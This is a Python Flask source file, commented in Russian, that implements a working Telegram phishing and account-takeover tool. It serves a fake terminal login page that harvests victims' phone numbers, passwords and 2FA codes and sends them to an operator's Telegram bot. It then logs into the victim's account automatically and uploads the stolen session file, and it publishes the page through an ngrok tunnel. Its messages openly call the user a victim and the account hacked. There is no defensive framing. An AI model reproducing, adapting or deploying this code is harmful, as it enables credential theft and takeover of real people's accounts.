from flask import Flask, render_template, request, session, redirect
from telethon.sync import TelegramClient
from telethon.errors import SessionPasswordNeededError
from pyngrok import ngrok
import requests
import asyncio
import os

app = Flask(__name__)
app.secret_key = "androidterm"

# === ТВОИ НАСТРОЙКИ ===
BOT_TOKEN = "YOUR_BOT_TOKEN"
CHAT_ID = "YOUR_CHAT_ID"
API_ID = 1234567                  # my.telegram.org
API_HASH = "your_api_hash"

def send(msg):
    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                  data={"chat_id": CHAT_ID, "text": msg, "parse_mode": "HTML"})

def send_file(path, caption):
    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
                  data={"chat_id": CHAT_ID, "caption": caption},
                  files={"document": open(path, "rb")})

async def auto_login(phone, password, code):
    session_name = f"sessions/{phone.replace('+','')}"
    client = TelegramClient(session_name, API_ID, API_HASH)
    try:
        await client.connect()
        if not await client.is_user_authorized():
            await client.send_code_request(phone)
            try:
                await client.sign_in(phone, code)
            except SessionPasswordNeededError:
                await client.sign_in(password=password)
        session_file = f"{session_name}.session"
        if os.path.exists(session_file):
            send(f"<b>АККАУНТ ВЗЛОМАН С АНДРОИДА</b>\nТелефон: {phone}")
            send_file(session_file, f"Сессия с Android Termux — {phone}")
    except Exception as e:
        send(f"Ошибка: {e}")
    finally:
        await client.disconnect()

@app.route('/')
def index(): return render_template('terminal.html')

@app.route('/login', methods=['POST'])
def login():
    session['phone'] = request.form['phone']
    session['password'] = request.form.get('password', 'Нет')
    send(f"<b>ЖЕРТВА С АНДРОИДА</b>\nТелефон: {session['phone']}\nПароль: {session['password']}")
    return render_template('terminal_code.html')

@app.route('/code', methods=['POST'])
def code():
    code = request.form['code']
    send(f"<b>2FA ПОЛУЧЕН</b>\nКод: {code}\nЗапускаю автологин...")
    os.makedirs('sessions', exist_ok=True)
    loop = asyncio.new_event_loop()
    loop.run_until_complete(auto_login(session['phone'], session['password'], code))
    return "<pre style='color:#0f0;background:#000;padding:20px;'>Authentication successful. Session captured.</pre>"

if __name__ == '__main__':
    # Авторизация ngrok (один раз)
    ngrok.set_auth_token("YOUR_NGROK_AUTHTOKEN")  # Получи на ngrok.com
    public_url = ngrok.connect(5000, "http")
    send(f"<b>ANDROID ФИШИНГ ЗАПУЩЕН</b>\nСсылка: <code>{public_url}</code>")
    app.run(host='0.0.0.0', port=5000)
